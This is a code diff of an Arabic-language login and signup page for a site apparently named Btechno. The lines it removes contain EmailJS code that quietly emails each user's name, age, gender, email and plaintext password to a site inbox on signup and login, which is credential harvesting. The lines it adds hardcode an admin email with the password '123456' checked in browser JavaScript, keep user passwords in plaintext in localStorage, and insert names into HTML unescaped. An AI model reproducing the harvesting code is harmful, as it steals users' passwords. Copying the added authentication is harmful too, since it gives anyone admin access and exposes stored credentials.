@@ -143,7 +143,6 @@ button:hover{
 
   <form id="authForm">
     <input type="text" id="name" placeholder="الاسم" style="display:none;">
-    <input type="text" id="gender" placeholder="النوع" style="display:none;">
     <input type="number" id="age" placeholder="السن" style="display:none;">
     <input type="email" id="email" placeholder="البريد الإلكتروني" required>
     <input type="password" id="password" placeholder="كلمة المرور" required>
@@ -155,12 +154,6 @@ button:hover{
 
 <div id="toast" class="toast"></div>
 
-<!-- EmailJS -->
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-<script>
-  emailjs.init("3pBE5P5gfa6PPk2Wu");
-</script>
-
 <script>
 const authForm = document.getElementById("authForm");
 const toggleForm = document.getElementById("toggleForm");
@@ -169,42 +162,10 @@ const submitBtn = document.getElementById("submitBtn");
 const toast = document.getElementById("toast");
 
 const nameInput = document.getElementById("name");
-const genderInput = document.getElementById("gender");
 const ageInput = document.getElementById("age");
 
 let isSignUp = false;
 let accounts = JSON.parse(localStorage.getItem("accounts")) || [];
-
-// إرسال الإيميل
-function sendAuthEmail(type, name, email, gender="", age="", password=""){
-  emailjs.send(
-    "service_al1b7s2",
-    "template_4a7un8j",
-    {
-      to_name: name,
-      to_email: email, // المستخدم عشان يظهر في Content
-      action: type === "signup" ? "إنشاء حساب جديد" : "تسجيل دخول",
-      message: type === "signup"
-        ? `تم إنشاء حساب جديد
-الاسم: ${name}
-البريد الإلكتروني: ${email}
-النوع: ${gender}
-السن: ${age}
-كلمة المرور: ${password}`
-        : `تم تسجيل دخول
-الاسم: ${name}
-البريد الإلكتروني: ${email}
-النوع: ${gender}
-السن: ${age}`
-    }
-  ).then(
-    ()=>console.log("✅ Email Sent"),
-    err=>console.error("❌ Email Error", err)
-  );
-}
-
-
-
 
 // spark effect
 document.addEventListener("mousemove", e=>{
@@ -231,25 +192,21 @@ toggleForm.addEventListener("click", ()=>{
     submitBtn.innerText = "إنشاء حساب";
     toggleForm.innerText = "لديك حساب؟ تسجيل الدخول";
     nameInput.style.display="block";
-    genderInput.style.display="block";
     ageInput.style.display="block";
     nameInput.required = true;
-    genderInput.required = true;
     ageInput.required = true;
   }else{
     formTitle.innerText = "تسجيل الدخول إلى حسابك";
     submitBtn.innerText = "دخول";
     toggleForm.innerText = "ليس لديك حساب؟ إنشاء حساب";
     nameInput.style.display="none";
-    genderInput.style.display="none";
     ageInput.style.display="none";
     nameInput.required = false;
-    genderInput.required = false;
     ageInput.required = false;
   }
 });
 
-// دالة رسالة الترحيب الاحترافية
+// رسالة ترحيب
 function showWelcomeMessage(name, callback){
   const bubble = document.createElement("div");
   bubble.style.position = "fixed";
@@ -267,18 +224,14 @@ function showWelcomeMessage(name, callback){
   bubble.style.opacity = "0";
   bubble.style.textAlign = "center";
   bubble.style.transition = "opacity 0.5s, transform 0.5s";
-  bubble.innerHTML = `🎉 مرحباً <span style="color:#A52A2A
-">${name}</span>!<br>تم تسجيل الدخول بنجاح`;
-
+  bubble.innerHTML = `🎉 مرحباً <span style="color:#A52A2A">${name}</span>!<br>تم تسجيل الدخول بنجاح`;
   document.body.appendChild(bubble);
 
-  // ظهور الرسالة
   setTimeout(()=>{
     bubble.style.opacity = "1";
     bubble.style.transform = "translate(-50%, -50%) scale(1.05)";
   },50);
 
-  // اختفاء الرسالة بعد ثانيتين
   setTimeout(()=>{
     bubble.style.opacity = "0";
     bubble.style.transform = "translate(-50%, -50%) scale(0.9)";
@@ -295,57 +248,39 @@ authForm.addEventListener("submit", e=>{
   const email = document.getElementById("email").value.trim();
   const password = document.getElementById("password").value.trim();
   const name = nameInput.value.trim();
-  const gender = genderInput.value.trim();
   const age = ageInput.value.trim();
 
- if(isSignUp){
-  if(accounts.some(acc=>acc.email===email)){
-    showToast("هذا البريد مسجل بالفعل ❌");
-    return;
+  // بيانات الأدمن
+  const ADMIN_EMAIL = "admin@btechno.com";
+  const ADMIN_PASS = "123456";
+
+  if(isSignUp){
+    if(accounts.some(acc=>acc.email===email)){
+      showToast("هذا البريد مسجل بالفعل ❌");
+      return;
+    }
+    accounts.push({
+      name, age, email, password, balance:0, totalProfit:0, lastDaily:0
+    });
+    localStorage.setItem("accounts", JSON.stringify(accounts));
+    localStorage.setItem("currentUser", JSON.stringify({name,email}));
+    showWelcomeMessage(name, ()=>{ window.location.href="Btechno2.html"; });
+  } else {
+    // تحقق الأدمن أولًا
+    if(email===ADMIN_EMAIL && password===ADMIN_PASS){
+      localStorage.setItem("isAdmin","true");
+      showWelcomeMessage("Admin", ()=>{ window.location.href="admin.html"; });
+      return;
+    }
+
+    const user = accounts.find(acc=>acc.email===email && acc.password===password);
+    if(user){
+      localStorage.setItem("currentUser", JSON.stringify(user));
+      showWelcomeMessage(user.name, ()=>{ window.location.href="Btechno2.html"; });
+    } else {
+      showToast("❌ الإيميل أو كلمة المرور غير صحيحة");
+    }
   }
-
-  accounts.push({
-  name,
-  gender,
-  age,
-  email,
-  password,
-  balance: 0,
-  totalProfit: 0,
-  lastDaily: 0
-});
-
-  localStorage.setItem("accounts", JSON.stringify(accounts));
-  localStorage.setItem("currentUser", JSON.stringify({name,email}));
-
-  // ✅ إرسال إيميل إشعار على btechno1010@gmail.com
-  sendAuthEmail("signup", name, email, gender, age, password);
-
-
-  showWelcomeMessage(name, ()=>{
-    window.location.href="Btechno2.html";
-  });
-
-}else{
-  const user = accounts.find(acc=>acc.email===email);
-  if(!user){ showToast("البريد الإلكتروني غير موجود ❌"); return; }
-  if(user.password!==password){ showToast("كلمة المرور خاطئة ❌"); return; }
-
-  localStorage.setItem(
-  "currentUser",
-  JSON.stringify({ email: user.email })
-);
-
-
-  // ✅ إرسال إيميل إشعار على btechno1010@gmail.com
-  sendAuthEmail("login", user.name, user.email, user.gender, user.age, user.password);
-
-
-  showWelcomeMessage(user.name, ()=>{
-    window.location.href="Btechno2.html";
-  });
-}
-
 });
 </script>
 </body>
